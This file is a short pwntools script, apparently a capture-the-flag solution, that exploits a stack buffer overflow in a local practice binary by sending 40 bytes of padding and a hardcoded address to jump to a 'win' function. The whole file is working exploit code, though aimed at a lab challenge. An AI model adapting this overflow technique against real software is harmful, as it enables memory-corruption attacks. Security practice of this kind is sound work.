from pwn import *

context.log_level = "error"
binary = "./chall"
elf = ELF(binary)
context.binary = binary

p = process("./chall")
#gdb.attach(p)

payload = b"A"*40
#g = cyclic_gen()
#payload = g.get(50)
#idx = g.find(b'\x61\x61\x61\x6c')
# (41, 0, 41)
# starting at 41, we overwrite into RBP
#print(elf.sym['win'])
payload += b"\xe6\x11\x40\x00\x00\x00\x00\x00"
#payload += pack(elf.sym['win'])
#print(payload)

p.readuntil(b"name?")
#p.sendline(b"45")
p.sendline(str(len(payload)).encode())
p.readuntil(b"name?")
p.sendline(payload)

#p.interactive()
print(p.readline())
print(p.readline())

# win address = 0x4011e6